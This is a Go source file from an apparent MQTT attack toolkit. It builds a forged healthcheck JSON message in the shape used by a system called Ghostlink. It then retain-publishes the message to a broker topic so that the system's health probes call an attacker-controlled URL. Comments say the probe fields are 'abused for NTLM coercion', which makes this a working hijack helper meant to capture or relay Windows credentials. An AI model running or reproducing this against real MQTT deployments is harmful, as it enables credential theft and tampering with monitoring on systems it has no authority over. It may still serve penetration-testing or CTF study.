package mqttcli

import (
	"encoding/json"
	"fmt"
	"net/url"
	"time"
)

// HealthcheckPayload is the Ghostlink-shaped MQTT healthcheck JSON.
type HealthcheckPayload struct {
	Timestamp string               `json:"timestamp"`
	Node      string               `json:"node"`
	Telemetry HealthcheckTelemetry `json:"telemetry"`
}

// HealthcheckTelemetry holds probe fields abused for NTLM coercion.
type HealthcheckTelemetry struct {
	Healthy         bool   `json:"healthy"`
	URL             string `json:"url"`
	LastCheckSecAgo int    `json:"lastCheckSecAgo"`
	ResponseCode    string `json:"responseCode"`
	IP              string `json:"ip,omitempty"`
	LatencyMs       int    `json:"latencyMs,omitempty"`
}

// HealthcheckOptions configures a retain publish for healthcheck hijack.
type HealthcheckOptions struct {
	Node string // default node-6
	IP   string // optional telemetry.ip
	URL  string // attacker-controlled probe URL (required)
}

// BuildHealthcheckJSON builds compact JSON matching Ghostlink healthcheck shape.
func BuildHealthcheckJSON(opts HealthcheckOptions) ([]byte, error) {
	if opts.URL == "" {
		return nil, fmt.Errorf("healthcheck: url is required")
	}
	u, err := url.Parse(opts.URL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return nil, fmt.Errorf("healthcheck: url must be absolute (http://host:port/...): %q", opts.URL)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, fmt.Errorf("healthcheck: url scheme must be http or https")
	}
	node := opts.Node
	if node == "" {
		node = "node-6"
	}
	// Ghostlink-style timestamp: 2026-03-03-09:26:21
	ts := time.Now().UTC().Format("2006-01-02-15:04:05")
	p := HealthcheckPayload{
		Timestamp: ts,
		Node:      node,
		Telemetry: HealthcheckTelemetry{
			Healthy:         true,
			URL:             opts.URL,
			LastCheckSecAgo: 45,
			ResponseCode:    "200",
			IP:              opts.IP,
		},
	}
	return json.Marshal(p)
}

// HealthcheckHijack retain-publishes a healthcheck payload that points probes at attackerURL.
func HealthcheckHijack(o Options, topic string, hc HealthcheckOptions) error {
	if topic == "" {
		return fmt.Errorf("healthcheck: topic is required")
	}
	body, err := BuildHealthcheckJSON(hc)
	if err != nil {
		return err
	}
	return Publish(o, topic, body, true, 1)
}
